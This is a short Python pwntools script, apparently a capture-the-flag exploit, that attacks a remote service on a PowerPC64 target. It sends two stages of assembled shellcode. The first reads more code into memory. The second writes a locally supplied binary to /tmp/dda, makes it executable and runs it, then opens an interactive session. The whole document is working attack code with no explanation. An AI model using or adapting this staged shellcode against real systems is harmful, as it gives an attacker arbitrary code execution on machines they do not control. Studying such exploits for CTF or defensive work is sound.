from pwn import *
import time

#host = "140.115.53.13"
#port = 64611
host = "10.211.55.23"
port = 5555

r = remote(host,port)

context.endian = 'little'
sc = asm(
"""
_execsh:
   xor.    3, 3, 3
   bnel    _execsh
   mflr    4
   addi    4, 4, 8
   li      5,800
   li      0,3
   sc

""",arch="powerpc64")
print len(sc)
r.sendline(sc.ljust(63,"\x00"))

nop = asm(
"""
xor.    5,5,5
""",arch="powerpc64")

sc2 = asm(
"""
_execsh:
   xor.    4, 4, 4
   bnel    _execsh
   mflr    3
   addi    3, 3, 104
   li      4, 0x1ff
   li      0, 8
   sc
   li      3,0
   mflr    4
   addi    4, 4, 0x4000
   li      5, 0x3000
   li      0,3
   sc
   mr      5,3
   li      3,3
   mflr    4
   addi    4, 4, 0x4000
   li      0,4
   sc
   li      3,3
   li      0,6
   sc
   xor.    4,4,4
   xor.    5,5,5
   mflr    3
   addi    3,3,104
   li      0,11
   sc


_path:
   .ascii "/tmp/dda"
   .long   0

""",arch="powerpc64")
r.sendline(nop*0x10 + sc2)
time.sleep(1)
f = open("orangel","r")
data = f.read()
r.send(data)
time.sleep(1)
raw_input()
r.send("/\x00")
r.interactive()
